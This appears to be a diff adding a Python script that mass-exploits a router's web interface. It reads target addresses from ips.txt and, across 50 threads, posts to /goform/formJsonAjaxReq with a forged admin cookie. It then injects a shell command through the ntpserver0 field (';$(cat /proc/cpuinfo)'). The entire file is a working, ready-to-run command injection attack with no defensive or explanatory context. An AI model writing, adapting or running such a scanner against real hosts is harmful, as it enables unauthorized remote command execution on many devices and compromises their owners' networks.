@@ -1,0 +1,65 @@
+import requests
+from concurrent.futures import ThreadPoolExecutor
+
+def process_host(ip_port):
+    url = f"http://{ip_port}/goform/formJsonAjaxReq"
+
+    headers = {
+        "Host": ip_port,
+        "Content-Length": "136",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+        "Content-Type": "application/json",
+        "Referer": f"http://{ip_port}/home.asp",
+        "Cookie": "userLanguage=EN; username=admin",
+        "Connection": "close"
+    }
+
+    try:
+
+        response = requests.post(url, json=initial_payload, headers=headers)
+        response.raise_for_status()  
+
+        if '{"status":1}' in response.text:
+            print(f"[*] {ip_port}")
+
+            response = requests.post(url, json=additional_payload, headers=headers)
+            response.raise_for_status() 
+
+            if '{"status":1}' in response.text:
+                print(f"[*] {ip_port}")
+            else:
+                print(f"[*] {ip_port}")
+
+    except requests.exceptions.RequestException as e:
+        # print(f"[-] {ip_port}: {e}")
+        pass
+
+with open("ips.txt", "r") as file:
+    ip_port_list = file.readlines()
+
+ip_port_list = [ip.strip() for ip in ip_port_list]
+
+initial_payload = {
+    "action": "set_online",
+    "options": {
+        "enable": 0,
+        "check_ips": ["8.8.8.8", "8.8.4.4"],
+        "interval": 10,
+        "reboot_interval": 30,
+        "agree": 1
+    }
+}
+
+additional_payload = {
+    "action": "set_timesetting",
+    "data": {
+        "ntpserver0": ";$(cat /proc/cpuinfo)",
+        "ntpserver1": "time.ntp.org",
+        "timezone": "UTC-8"
+    }
+}
+
+max_threads = 50
+
+with ThreadPoolExecutor(max_threads) as executor:
+    executor.map(process_host, ip_port_list)
